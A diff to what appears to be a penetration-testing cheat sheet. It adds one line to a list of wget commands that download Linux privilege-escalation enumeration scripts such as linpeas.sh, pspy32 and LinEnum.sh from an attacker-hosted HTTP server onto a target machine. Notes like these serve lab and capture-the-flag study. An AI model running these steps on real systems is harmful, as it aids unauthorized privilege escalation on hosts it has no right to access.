@@ -176,6 +176,7 @@ sudo python3 -m http.server 80
 cd /var/tmp 
 wget http://192.168.162.46:80/linpeas.sh                  ..best
 wget http://192.168.162.46:80/pspy32                      ..crons
+wget http://192.168.162.46:80/suid3num.py                 ..suid check
 wget http://192.168.162.46:80/Linuxprivchecker.py         ..prefer 
 wget http://192.168.162.46:80/LinEnum.sh                  ..second best 
 wget http://192.168.162.46:80/unixprivesc.sh              ..maybe
